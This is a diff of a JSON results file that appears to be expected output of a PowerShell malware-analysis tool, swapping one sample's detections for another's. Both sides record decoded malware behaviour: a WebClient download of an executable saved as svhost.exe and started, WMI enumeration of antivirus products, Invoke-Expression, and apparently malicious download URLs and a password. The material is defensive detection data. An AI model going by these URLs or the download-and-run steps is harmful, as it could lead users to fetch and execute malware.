@@ -1,11 +1,11 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 1532,
+    "score": 1052,
     "sections": [
       {
         "auto_collapse": false,
-        "body": "[System.Net.WebClient.DownloadFile] Download From: https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe --> Save To: ./APPDATA/svhost.exe\n\n[Start-Process] ./APPDATA/svhost.exe\n",
+        "body": "[Get-WmiObject] -Class Win32_OperatingSystem\n\n[Get-WmiObject] Win32_ComputerSystem\n\n[Get-WmiObject] -Namespace root\\SecurityCenter2 -Class AntiVirusProduct\n",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -14,78 +14,18 @@
           "attack_ids": [],
           "frequency": 1,
           "heur_id": 5,
-          "score": 500,
-          "score_map": {},
-          "signatures": {
-            "suspicious_behaviour_combo_url": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {
-          "file": {
-            "path": [
-              "./APPDATA/svhost.exe"
-            ]
-          },
-          "network": {
-            "dynamic": {
-              "domain": [
-                "oiartzunirratia.eus"
-              ],
-              "uri": [
-                "https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe"
-              ],
-              "uri_path": [
-                "/install/clean/Lcovlccdxd.exe"
-              ]
-            }
-          }
-        },
-        "title_text": "Actions detected with PSDecode",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"oiartzunirratia.eus\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/install/clean/Lcovlccdxd.exe\"}]",
-        "body_config": {
-          "column_order": [
-            "ioc_type",
-            "ioc"
-          ]
-        },
-        "body_format": "TABLE",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 1,
           "score": 1,
           "score_map": {},
           "signatures": {}
         },
         "promote_to": null,
-        "tags": {
-          "network": {
-            "dynamic": {
-              "domain": [
-                "oiartzunirratia.eus"
-              ],
-              "uri": [
-                "https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe"
-              ],
-              "uri_path": [
-                "/install/clean/Lcovlccdxd.exe"
-              ]
-            }
-          }
-        },
-        "title_text": "IOCs found in actions",
+        "tags": {},
+        "title_text": "Actions detected with PSDecode",
         "zeroize_on_tag_safe": false
       },
       {
         "auto_collapse": false,
-        "body": "\t- %APPDATA%\\svhost.exe",
+        "body": "\t- ./\\646145624556",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -95,7 +35,7 @@
         "tags": {
           "file": {
             "path": [
-              "%APPDATA%\\svhost.exe"
+              "./\\646145624556"
             ]
           }
         },
@@ -104,7 +44,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "\t- https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe",
+        "body": "\t- http://756-ads-info.xyz/?status=start&av=&domain=&os=\n\t- http://refreshmet.com/Package.tar.gpg\n\t- http://756-ads-info.xyz/?status=install\n\t- http://756-ads-info.xyz",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -124,13 +64,19 @@
           "network": {
             "dynamic": {
               "domain": [
-                "oiartzunirratia.eus"
+                "756-ads-info.xyz",
+                "refreshmet.com"
               ],
               "uri": [
-                "https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe"
+                "http://756-ads-info.xyz/?status=start&av=&domain=&os=",
+                "http://refreshmet.com/Package.tar.gpg",
+                "http://756-ads-info.xyz/?status=install",
+                "http://756-ads-info.xyz"
               ],
               "uri_path": [
-                "/install/clean/Lcovlccdxd.exe"
+                "/?status=start&av=&domain=&os=",
+                "/Package.tar.gpg",
+                "/?status=install"
               ]
             }
           }
@@ -148,12 +94,12 @@
         "heuristic": null,
         "promote_to": null,
         "tags": {},
-        "title_text": "Suspicious Content Detected in 8dcad766215c455f6c70f5e78ebb1776e5e436775cbb7f66f1d5d4ccd217e03a",
+        "title_text": "Suspicious Content Detected in 6b3e7697c4b50e849ef7d3cafe62a1a6afbf0415ee6f6f9787f5b84b2941c3d9",
         "zeroize_on_tag_safe": false
       },
       {
         "auto_collapse": false,
-        "body": "Marks: Net.WebClient, DownloadFile",
+        "body": "Marks: Invoke-WebRequest",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -177,7 +123,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "Marks: Start-Process",
+        "body": "Marks: Invoke-Expression",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -188,20 +134,20 @@
           "heur_id": 3,
           "score": 10,
           "score_map": {
-            "Starts Process": 10
+            "Script Execution": 10
           },
           "signatures": {
-            "Starts Process": 1
+            "Script Execution": 1
           }
         },
         "promote_to": null,
         "tags": {},
-        "title_text": "Signature: Starts Process",
+        "title_text": "Signature: Script Execution",
         "zeroize_on_tag_safe": false
       },
       {
         "auto_collapse": false,
-        "body": "Marks: WindowStyle, Hidden, -W, Hidden",
+        "body": "Marks: Win32_OperatingSystem, Win32_ComputerSystem",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -212,20 +158,44 @@
           "heur_id": 3,
           "score": 10,
           "score_map": {
-            "Hidden Window": 10
+            "Enumeration": 10
           },
           "signatures": {
-            "Hidden Window": 1
+            "Enumeration": 1
           }
         },
         "promote_to": null,
         "tags": {},
-        "title_text": "Signature: Hidden Window",
+        "title_text": "Signature: Enumeration",
         "zeroize_on_tag_safe": false
       },
       {
         "auto_collapse": false,
-        "body": "Marks: Downloader, Starts Process, Hidden Window",
+        "body": "Marks: Get-WmiObject",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Uses WMI": 10
+          },
+          "signatures": {
+            "Uses WMI": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: Uses WMI",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: Downloader, Script Execution, Uses WMI",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -249,7 +219,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"oiartzunirratia.eus\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/install/clean/Lcovlccdxd.exe\"}]",
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"756-ads-info.xyz\"}, {\"ioc_type\": \"domain\", \"ioc\": \"refreshmet.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://756-ads-info.xyz\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://refreshmet.com/Package.tar.gpg\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/Package.tar.gpg\"}]",
         "body_config": {
           "column_order": [
             "ioc_type",
@@ -272,38 +242,81 @@
           "network": {
             "static": {
               "domain": [
-                "oiartzunirratia.eus"
+                "756-ads-info.xyz",
+                "refreshmet.com"
               ],
               "uri": [
-                "https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe"
+                "http://756-ads-info.xyz",
+                "http://refreshmet.com/Package.tar.gpg"
               ],
               "uri_path": [
-                "/install/clean/Lcovlccdxd.exe"
+                "/Package.tar.gpg"
               ]
             }
           }
         },
-        "title_text": "IOC(s) extracted from 8dcad766215c455f6c70f5e78ebb1776e5e436775cbb7f66f1d5d4ccd217e03a",
+        "title_text": "IOC(s) extracted from 6b3e7697c4b50e849ef7d3cafe62a1a6afbf0415ee6f6f9787f5b84b2941c3d9",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Suspicious Content Detected in layer_0.ps1",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "One Liner": 10
+          },
+          "signatures": {
+            "One Liner": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: One Liner",
         "zeroize_on_tag_safe": false
       }
     ]
   },
   "files": {
-    "extracted": [],
+    "extracted": [
+      {
+        "name": "AAADADC7DFAAC7B6225422DEB7FE990CD7DDC6C6B628A0F6366A93EA47C257E7",
+        "sha256": "aaadadc7dfaac7b6225422deb7fe990cd7ddc6c6b628a0f6366a93ea47c257e7"
+      },
+      {
+        "name": "params.json",
+        "sha256": "fab694749c40aeca0b76a7cf3f720fcbf059e6c53f4f251354adc0cb2f750179"
+      }
+    ],
     "supplementary": [
       {
-        "name": "4c71d0762784da7354cea1dccff804fd031788c0baca5b40caf5730e72590f44",
-        "sha256": "4c71d0762784da7354cea1dccff804fd031788c0baca5b40caf5730e72590f44"
+        "name": "2a8319fdbca1d3d4edb42f39d1fc31ee151e61b501fb1719cf9f869ef93024d5",
+        "sha256": "2a8319fdbca1d3d4edb42f39d1fc31ee151e61b501fb1719cf9f869ef93024d5"
       }
     ]
   },
   "results": {
     "heuristics": [
-      {
-        "attack_ids": [],
-        "heur_id": 1,
-        "signatures": []
-      },
       {
         "attack_ids": [],
         "heur_id": 1,
@@ -320,14 +333,21 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
-          "Starts Process"
+          "Script Execution"
         ]
       },
       {
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
-          "Hidden Window"
+          "Enumeration"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Uses WMI"
         ]
       },
       {
@@ -339,10 +359,15 @@
       },
       {
         "attack_ids": [],
-        "heur_id": 5,
+        "heur_id": 3,
         "signatures": [
-          "suspicious_behaviour_combo_url"
+          "One Liner"
         ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 5,
+        "signatures": []
       },
       {
         "attack_ids": [],
@@ -357,103 +382,115 @@
         {
           "heur_id": null,
           "signatures": [],
-          "value": "%APPDATA%\\svhost.exe"
-        },
-        {
-          "heur_id": 5,
-          "signatures": [
-            "suspicious_behaviour_combo_url"
-          ],
-          "value": "./APPDATA/svhost.exe"
+          "value": "./\\646145624556"
         }
       ],
       "network.dynamic.domain": [
         {
-          "heur_id": 5,
+          "heur_id": 7,
           "signatures": [
             "suspicious_behaviour_combo_url"
           ],
-          "value": "oiartzunirratia.eus"
-        },
-        {
-          "heur_id": 1,
-          "signatures": [],
-          "value": "oiartzunirratia.eus"
+          "value": "756-ads-info.xyz"
         },
         {
           "heur_id": 7,
           "signatures": [
             "suspicious_behaviour_combo_url"
           ],
-          "value": "oiartzunirratia.eus"
+          "value": "refreshmet.com"
         }
       ],
       "network.dynamic.uri": [
         {
-          "heur_id": 5,
+          "heur_id": 7,
           "signatures": [
             "suspicious_behaviour_combo_url"
           ],
-          "value": "https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe"
-        },
-        {
-          "heur_id": 1,
-          "signatures": [],
-          "value": "https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe"
+          "value": "http://756-ads-info.xyz"
         },
         {
           "heur_id": 7,
           "signatures": [
             "suspicious_behaviour_combo_url"
           ],
-          "value": "https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe"
+          "value": "http://756-ads-info.xyz/?status=install"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "http://756-ads-info.xyz/?status=start&av=&domain=&os="
+        },
+        {
+          "heur_id": 7,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "http://refreshmet.com/Package.tar.gpg"
         }
       ],
       "network.dynamic.uri_path": [
         {
-          "heur_id": 5,
+          "heur_id": 7,
           "signatures": [
             "suspicious_behaviour_combo_url"
           ],
-          "value": "/install/clean/Lcovlccdxd.exe"
-        },
-        {
-          "heur_id": 1,
-          "signatures": [],
-          "value": "/install/clean/Lcovlccdxd.exe"
+          "value": "/?status=install"
         },
         {
           "heur_id": 7,
           "signatures": [
             "suspicious_behaviour_combo_url"
           ],
-          "value": "/install/clean/Lcovlccdxd.exe"
+          "value": "/?status=start&av=&domain=&os="
+        },
+        {
+          "heur_id": 7,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "/Package.tar.gpg"
         }
       ],
       "network.static.domain": [
         {
           "heur_id": 1,
           "signatures": [],
-          "value": "oiartzunirratia.eus"
+          "value": "756-ads-info.xyz"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "refreshmet.com"
         }
       ],
       "network.static.uri": [
         {
           "heur_id": 1,
           "signatures": [],
-          "value": "https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe"
+          "value": "http://756-ads-info.xyz"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "http://refreshmet.com/Package.tar.gpg"
         }
       ],
       "network.static.uri_path": [
         {
           "heur_id": 1,
           "signatures": [],
-          "value": "/install/clean/Lcovlccdxd.exe"
+          "value": "/Package.tar.gpg"
         }
       ]
     },
     "temp_submission_data": {
-      "deobfuscated_by_ps1profiler": true
+      "deobfuscated_by_ps1profiler": true,
+      "passwords": [
+        "pendosi"
+      ]
     }
   }
 }
